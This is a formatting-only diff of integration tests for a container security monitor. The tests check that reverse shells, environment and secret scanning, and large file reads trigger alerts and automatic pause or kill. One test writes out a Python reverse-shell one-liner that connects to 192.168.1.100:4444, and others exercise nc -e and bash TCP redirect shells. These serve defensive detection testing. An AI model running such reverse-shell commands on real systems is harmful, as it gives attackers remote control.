@@ -126,7 +126,9 @@ def get_audit_events(audit_log_path):
 class TestReverseShellDetection:
     """Test reverse shell detection and CRITICAL response (container kill)."""
 
-    def test_nc_reverse_shell_killed(self, test_container, audit_log_path, coi_binary, monitoring_config):
+    def test_nc_reverse_shell_killed(
+        self, test_container, audit_log_path, coi_binary, monitoring_config
+    ):
         """Test that nc -e reverse shell triggers CRITICAL alert and kills container."""
         # Enable auto-kill for this test
         monitoring_config.parent.mkdir(parents=True, exist_ok=True)
@@ -188,8 +190,7 @@ poll_interval_sec = 2
         reverse_shell_events = [
             e
             for e in events
-            if e.get("level") == "critical"
-            and "reverse" in e.get("title", "").lower()
+            if e.get("level") == "critical" and "reverse" in e.get("title", "").lower()
         ]
 
         assert len(reverse_shell_events) > 0, (
@@ -202,15 +203,15 @@ poll_interval_sec = 2
         assert event.get("category") in ["process", "threat"], (
             "Event should be categorized as process/threat"
         )
-        assert "nc -e" in str(event.get("evidence", {})), (
-            "Event should contain nc -e in evidence"
-        )
+        assert "nc -e" in str(event.get("evidence", {})), "Event should contain nc -e in evidence"
 
         # Cleanup
         proc.terminate()
         proc.wait(timeout=30)
 
-    def test_bash_tcp_redirect_killed(self, test_container, audit_log_path, coi_binary, monitoring_config):
+    def test_bash_tcp_redirect_killed(
+        self, test_container, audit_log_path, coi_binary, monitoring_config
+    ):
         """Test that bash TCP redirect reverse shell triggers CRITICAL alert."""
         # First restart container if it was killed in previous test
         subprocess.run(
@@ -279,7 +280,9 @@ poll_interval_sec = 2
         proc.terminate()
         proc.wait(timeout=30)
 
-    def test_python_reverse_shell_killed(self, test_container, audit_log_path, coi_binary, monitoring_config):
+    def test_python_reverse_shell_killed(
+        self, test_container, audit_log_path, coi_binary, monitoring_config
+    ):
         """Test that Python reverse shell patterns trigger CRITICAL alert."""
         # Restart container
         subprocess.run(
@@ -316,7 +319,7 @@ poll_interval_sec = 2
         python_reverse_shell = (
             "python3 -c 'import socket,subprocess,os;"
             "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
-            "s.connect((\"192.168.1.100\",4444));' &"
+            's.connect(("192.168.1.100",4444));\' &'
         )
 
         subprocess.run(
@@ -389,22 +392,16 @@ class TestEnvironmentScanningDetection:
 
         # Verify container is still running (not paused/killed)
         state = get_container_state(test_container)
-        assert state == "RUNNING", (
-            f"Container should still be running after WARNING, got {state}"
-        )
+        assert state == "RUNNING", f"Container should still be running after WARNING, got {state}"
 
         # Verify audit log contains WARNING event
         events = get_audit_events(audit_log_path)
         env_events = [
-            e
-            for e in events
-            if e.get("level") == "warning"
-            and "env" in e.get("title", "").lower()
+            e for e in events if e.get("level") == "warning" and "env" in e.get("title", "").lower()
         ]
 
         assert len(env_events) > 0, (
-            f"Expected WARNING env scanning event. "
-            f"Events: {[e.get('title') for e in events]}"
+            f"Expected WARNING env scanning event. Events: {[e.get('title') for e in events]}"
         )
 
         # Cleanup
@@ -442,7 +439,9 @@ class TestEnvironmentScanningDetection:
             e
             for e in events
             if e.get("level") == "warning"
-            and ("grep" in str(e.get("evidence", {})).lower() or "scan" in e.get("title", "").lower())
+            and (
+                "grep" in str(e.get("evidence", {})).lower() or "scan" in e.get("title", "").lower()
+            )
         ]
 
         assert len(grep_events) > 0, "Expected WARNING for secret scanning"
@@ -482,10 +481,7 @@ class TestEnvironmentScanningDetection:
         # Verify detection
         events = get_audit_events(audit_log_path)
         printenv_events = [
-            e
-            for e in events
-            if e.get("level") == "warning"
-            and "env" in e.get("title", "").lower()
+            e for e in events if e.get("level") == "warning" and "env" in e.get("title", "").lower()
         ]
 
         assert len(printenv_events) > 0, "Expected WARNING for printenv"
@@ -500,7 +496,9 @@ class TestEnvironmentScanningDetection:
 class TestLargeFileReadDetection:
     """Test large file read detection and HIGH response (container pause)."""
 
-    def test_large_read_pauses_container(self, test_container, audit_log_path, coi_binary, monitoring_config):
+    def test_large_read_pauses_container(
+        self, test_container, audit_log_path, coi_binary, monitoring_config
+    ):
         """Test that reading >50MB triggers HIGH alert and pauses container."""
         # Configure monitoring with lower threshold for faster testing
         monitoring_config.parent.mkdir(parents=True, exist_ok=True)
@@ -570,25 +568,26 @@ file_read_rate_mb_per_sec = 5.0
             e
             for e in events
             if e.get("level") == "high"
-            and ("read" in e.get("title", "").lower() or "exfiltration" in e.get("title", "").lower())
+            and (
+                "read" in e.get("title", "").lower() or "exfiltration" in e.get("title", "").lower()
+            )
         ]
 
         assert len(large_read_events) > 0, (
-            f"Expected HIGH alert for large file read. "
-            f"Events: {[e.get('title') for e in events]}"
+            f"Expected HIGH alert for large file read. Events: {[e.get('title') for e in events]}"
         )
 
         # Verify container was paused
         state = get_container_state(test_container)
-        assert state == "FROZEN", (
-            f"Container should be frozen after large read, got {state}"
-        )
+        assert state == "FROZEN", f"Container should be frozen after large read, got {state}"
 
         # Cleanup
         proc.terminate()
         proc.wait(timeout=30)
 
-    def test_sustained_read_rate_detected(self, test_container, audit_log_path, coi_binary, monitoring_config):
+    def test_sustained_read_rate_detected(
+        self, test_container, audit_log_path, coi_binary, monitoring_config
+    ):
         """Test that sustained high read rate triggers detection."""
         # Restart container from frozen state
         subprocess.run(
@@ -683,7 +682,9 @@ file_read_rate_mb_per_sec = 3.0
 class TestAutomatedResponseVerification:
     """Test that automated responses (pause, kill) actually execute correctly."""
 
-    def test_auto_pause_executes(self, test_container, audit_log_path, coi_binary, monitoring_config):
+    def test_auto_pause_executes(
+        self, test_container, audit_log_path, coi_binary, monitoring_config
+    ):
         """Verify that auto_pause_on_high actually pauses the container."""
         # Restart container
         subprocess.run(
@@ -756,7 +757,9 @@ file_read_threshold_mb = 5.0
         proc.terminate()
         proc.wait(timeout=30)
 
-    def test_auto_kill_executes(self, test_container, audit_log_path, coi_binary, monitoring_config):
+    def test_auto_kill_executes(
+        self, test_container, audit_log_path, coi_binary, monitoring_config
+    ):
         """Verify that auto_kill_on_critical actually stops the container."""
         # Restart container
         subprocess.run(
@@ -815,8 +818,7 @@ poll_interval_sec = 2
         kill_events = [
             e
             for e in events
-            if "killed" in str(e.get("action", "")).lower()
-            or e.get("level") == "critical"
+            if "killed" in str(e.get("action", "")).lower() or e.get("level") == "critical"
         ]
         assert len(kill_events) > 0, "Audit log should record kill action"
 
@@ -824,7 +826,9 @@ poll_interval_sec = 2
         proc.terminate()
         proc.wait(timeout=30)
 
-    def test_disabled_monitoring_no_action(self, test_container, audit_log_path, coi_binary, monitoring_config):
+    def test_disabled_monitoring_no_action(
+        self, test_container, audit_log_path, coi_binary, monitoring_config
+    ):
         """Verify that disabled monitoring doesn't take any actions."""
         # Restart container
         subprocess.run(
